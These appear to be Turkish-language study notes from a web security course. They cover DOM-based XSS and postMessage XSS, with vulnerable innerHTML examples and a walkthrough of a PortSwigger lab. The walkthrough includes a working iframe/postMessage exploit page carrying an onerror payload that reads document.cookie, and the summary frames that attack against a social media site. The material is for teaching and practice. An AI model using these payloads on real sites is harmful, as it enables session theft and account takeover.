<h1 align="center">XSS - 2</h1>
 
# DOM XSS (Document Object Model XSS)(Belge Obje Modeli XSS) 

* Sözlük
    * DOM: Bir web adresinin yapısını belirtir. Bu modelin genel yapısı bir ağacın  dallanıp budaklanmasına benzer. Js programlama dili DOM içeriğine erişip düzenlemeler yapabilir. Buna **DOM Manipulation** ya da **DOM Update** denir.

* Kullanıcının bir web uygulamasında üyelik oluşturduğunu düşünelim;

![alt text](<WebSec101 0x09_ss/image.png>)

* Doğal olarak kullanıcı üyelik oluştururken burada bir **username(kullanıcı adı)** bilgisi de girecektir.

* Kullanıcın verdiği username bilgisi database'e kaydedilir;

![alt text](<WebSec101 0x09_ss/image-1.png>)

* Web uygulaması database'den aldığı username bilgisini tekrar kullanıcıya verir;



Şimdi kod üzerinde düşünelim;

```html
<html>
    <div id="msgArea">

    </div>

    <script>

        username = getUsername(); // veri tabanından username'i çağırır. 

        document.getElementById('msgArea').innerHTML= 'Merhaba ' +username; // Buradaki JS kodu da username'i kullanarak DOM'u update ediyor.

    </script>
</html>    
```

Şimdi username olarak <svg onload=alert(1)> kodunun yazıldığını varsayalım. JS çalışırken bu kodu;

```html

    <script>

        document.getElementById('msgArea').innerHTML= 'Merhaba  <svg onload=alert(1)>'; // İlk olarak buraya yerleşir.

    </script>

```

kodun bu kısmına yerleştirir. Sonra; 

```html
<html>
    <div id="msgArea"> 
            "Merhaba <"svg onload=alert(1)"> "  
    </div>
    <script>

        username = getUsername(); // veri tabanından username'i çağırır. 

        document.getElementById('msgArea').innerHTML= 'Merhaba ' +username; // Buradaki JS kodu da username'i kullanarak DOM'u update ediyor.

    </script>
</html>
```

Yukarıdaki şekilde msgArea bölgesine yerleştiriliyor. Yani browser bu kodu parse ediyor ve bu şekilde aslında **DOM XSS** ortaya çıkıyor. Burada can alıcı soru, ***DOM sitede veri tabanından aldığı bilgiler ile güncelleme yaparken hangi fonksiyonları nasıl kullanıyor*** olacaktır. Yani verdiğimiz örnekte DOM username bilgisini veritabanından alıp **div** üzerinden browser'a bir mesaj olarak veriyordu. Yani oradaki fonksiyonun çalışma biçimi bu biçimdeydi.

```
Safe
.text()
.attr() // still needs to be careful when used in an href
.prop()
.val()
Unsafe
$("html code")
.html()
.append*()
.insert*()
.prepend*()
.wrap*()
.before()
.after()

kaynak: (https://coderwall.com/p/h5lqla/safe-vs-unsafe-jquery-methods)
```
Yukarıdaki js fonksiyonları Güvenli ve güvensiz olarak ikiye ayrılmış durumda. Yani DOM'un güncelleme yaparken kullanabileceği fonksiyonlar burada toplanmış bir göz atmak aşinalık kazandırabilir. Sonuçta DOM bunlar aracılığıyla browser'da güncelleme yapacaktır ve XSS'in açığa çıktı yer de bu kısım.


## Public Firing Range

* **XSS egzersizleri için güzel site:**
    * **https://public-firing-range.appspot.com/** 


## PostMessage

* Sözlük
    * iframe: bir web sayfasının içerisindeki başka bir html içeriği. Pencere içinde pencere olarak düşünülebilir.

Post message, bir web uygulamasının pencereler, sekmeler ve iframeler ile yapabildiği güvenli iletişimdir. Basitçe bir pencerenin başka bir pencereye mesaj göndermesini sağlar.

Örn,

```html

<html>
  <head><title>Toxic DOM</title></head>
  <body>
    <script>
      var postMessageHandler = function(msg) {
  var content = JSON.parse(msg.data); // fonksiyondan buraya gelen mesaj verisi json olacak şekilde parse edilir.
  var div = document.createElement('div'); // Bu json pars edildiğinde  div elementi oluşturulur.
  div.innerHTML = content.html; // oluşturulan div elementinin içine html şeklinde yerleştirilir.
  document.documentElement.appendChild(div); // Sonra oluşan bu div sayfaya eklenir ve XSS burada açığa çıkar.
};

window.addEventListener('message', postMessageHandler, false); /* Kendisine mesaj geldiğinde bunu alır ve postMessageHandler 
                                                                  isimli fonskiyona gönderir                                                          */ 

    </script>
  </body>
</html>


```

Yukarıda aslında bir mesajın site içerisinde nasıl güncellendiğini gördük. Önce bir fonksiyona gidiyor oradan ayrıştırılıyor ve div elementi oluşturulup bununla birlikte siteye gidiyor. 

Şimdi bu yazdığımız kodu kullnarak alıştırma yapalım;

### XSS Alıştırma

* Sözlük
    * innerHTML: bir HTML tagının içindeki verileri okuyabilir ve değiştirebilir. 

* https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages bu adrese gelelim.

* Hedef siteye print() fonksiyonunu çalıştıracak bir mesaj yollamamızı istiyor. Access the Lab diyelim; 

![alt text](<WebSec101 0x09_ss/image-4.png>)

* CTRL+U tuşlarına ya da sayfaya sağ tıklayıp sayfa kaynağını görüntüle diyelim;

![alt text](<WebSec101 0x09_ss/image-5.png>)

* Biraz aşağıda highlight(vurgulanan yer) edilen kısımda tanıdık kodlar görüyoruz;

```html
<script>
      window.addEventListener('message', function(e) { // gelen mesajın datası function(e) içine konulmuş
        document.getElementById('ads').innerHTML = e.data; // bu data da direkt innerHTML'in içine konmuş.
     })
</script>
```

* Alıştırma ekranındaki url'i kopyalayalım;

![alt text](<WebSec101 0x09_ss/image-6.png>)

* Aşağıdaki basit html kodundaki target.src kısmına yapıştıralım; 


```html
<html>
  <iframe id="target" src=""></iframe> // 

  <script>
    var target = document.getElementById('target');

    target.addEventListener('load', function() {
      target.contentWindow.postMessage('asdasd' , '*');
    });

    target.src = "https://0ac200c803b8bc1f8008037900a80087.web-security-academy.net/";
  </script>
</html>
```

* Yukarıdaki kodu ayrı bir dosya olarak kaydedelim ve .html uzantısı ekleyelim(not defterine yazıp kaydedin sonrasında dosya .html uzantısı ekleyin.) ve açalım; 

![alt text](<WebSec101 0x09_ss/image-7.png>) 

* Gördüğümüz gibi alıştırma sayfası **iframe** olarak bizim html dosyasında gözüküyor. 

* Şimdi kodumuzda post message yazan yeri aslında **editleyebildiğimizi(düzenleyebildiğimizi)** fark edebiliriz. Şu anda öylesine bir değer olarak 'asdas' yazılmış oraya bir XSS kodu inject edebiliriz;

* 'asdas' yazan yeri <img src=x onerror=alert(document.cookie)> şeklinde değiştirelim. Kodun son hali;

```html
<html>
  <iframe id="target" src=""></iframe> // 

  <script>
    var target = document.getElementById('target');

    target.addEventListener('load', function() {
      target.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>' , '*');
    });

    target.src = "sosyalmedyasitesi.com";
  </script>
</html>
```
* Yukarıdaki kodu html dosyamızdakinin yerine yapıştıralım ve bir daha açalım; 

![alt text](<WebSec101 0x09_ss/image-8.png>)

* Görüldüğü üzere XSS inject edebildik.

* Şimdi alıştırma adresine geri dönüp **Go to Exploit Server** tuşuna basalım;

![alt text](<WebSec101 0x09_ss/image-10.png>)

* Böyle bir ekran var;

![alt text](<WebSec101 0x09_ss/image-11.png>)

* Burası alıştırmanın bize sağladığı sunucu. HTML dosyamızdaki kodları kopyalayalım ve body kısmına yapıştıralım;

![alt text](<WebSec101 0x09_ss/image-12.png>)

* Şimdi önce **store** tuşuna basalım, sonra da **deliver exploit to victim** diyelim;

![alt text](<WebSec101 0x09_ss/image-13.png>)

* Böylece alıştırma tamamlanmış oldu. 



# ÖZET

* Bir kullanıcı hacker.com isimli bir siteye gidiyor diye varsayalım;(bu sitenin aynı zamanda bir hacker tarafından kodlandığını da varsayalım.)

![alt text](<WebSec101 0x09_ss/image-14.png>)

* Bu siteden bir hacker tarafından kodlandığı için response olarak şöyle bir kod dönüyor;

![alt text](<WebSec101 0x09_ss/image-16.png>)

* Şimdi bu kod bizim az önce yazdığımız kodun aynısı ve hacker tarafından yazılmış. hacker.com bu response'u kullanıcıya döndüğünde, kullanıcının browserında **target.src** kısmında yazan adres(hacker'ın girdiği bir adres) iframe olarak açılacaktır.;

![alt text](<WebSec101 0x09_ss/image-17.png>)

* Gittiği bu adreste kullanıcın tüm cookieleri açığa çıkar ve dolayısıyla saldırgan tarafından hacklenir. *(Yani bunu aslında belirlenen web sitesinin kullanıcı tarafından zaten kullanıldığını varsayarak söylüyoruz. Buradaki 'sosyalmedyasitesi.com'u  yaygın kullanılan sosyal medya uygulamalarından biri olarak da düşünebiliriz. Ya da bir e ticaret sitesi olarak. Ana fikir kullanıcının muhtemel olarak kullandığı uygulamaları açtırtmak ki verilere ulaşılabilsin.)*

* Sonrasında kodda aşağıdaki kısım çalışmaya başlar; 

```html
target.addEventListener('load', function() {
      target.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>' , '*'); 
    });
```
**sayfanın yüklenmesi tamamlandığında bu adrese bir postmessage yollanıyor**. Bu postmessage'ın içerisinde ise **XSS payload** var.

* Hacker'ın yolladığı bu postmessage, hedef siteye gidiyor ve o sitedeki JS kodunu çalıştırıyor;

![alt text](<WebSec101 0x09_ss/image-19.png>)

![alt text](<WebSec101 0x09_ss/image-18.png>)

* Sitedeki muhtemel js kodu böyle bir şey ve hacker tarafından yollanan payload gelip bu kodu tetikliyor ve alert verdirtiyor. Dolayısıyla bir XSS zaafiyeti ortaya çıkmış oluyor. 


# KAYNAK

[Web Security 0x09 | XSS Güvenlik Zafiyeti Serüvenine Devam Part 2](https://www.youtube.com/watch?v=xXbDhyKo9B8&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=9)